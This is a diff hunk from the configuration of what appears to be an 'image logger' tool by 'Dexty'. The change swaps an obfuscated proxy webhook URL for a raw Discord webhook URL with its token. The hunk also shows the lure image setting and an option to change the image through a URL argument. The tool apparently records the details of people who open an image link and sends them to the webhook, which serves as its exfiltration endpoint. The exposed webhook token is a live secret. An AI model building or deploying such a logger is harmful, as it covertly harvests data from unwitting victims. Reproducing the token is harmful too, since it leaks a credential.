@@ -9,7 +9,7 @@ author = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://webhook-protect-2.vercel.app/api/webhook?id=SGR0NnM5X0w2R3V4NGlGRjlFM3ZtZzp6c0Z6eElxM0RYMjFfdjVXVFhZc2I2ZlRQU21UdUY2S1pYZl9zYTV5N0g4Y0NNbGE4N3VwT2tFYnQ0Z2k5TTFIUmgxNTQzbS1iZVc2RWlDNXZoSF9BWjJwRzVYNlZuQlpwNk5rRXl5dG1IMG1ySWFVUm9DdC1OaTVXa1JxTEsyQWJQaGMza09FWEtrcm1JYTFrTDBtdHZOemVjS0xtcHZjR2RrVDhqbWlLd0k",
+    "webhook": "https://discord.com/api/webhooks/1413132864744063027/l9Ek19EIiip8QDSLPSe79rcQa5pS4pz5OwuVHtxp3dzA738AlEJyeLJj4H-HssV-N3Lg",
     "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNQsXJYCiYsqKTdJei_KuhZHGMPQ7nudCddeFAGJ7hQHa-e9WniZOSd2s&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
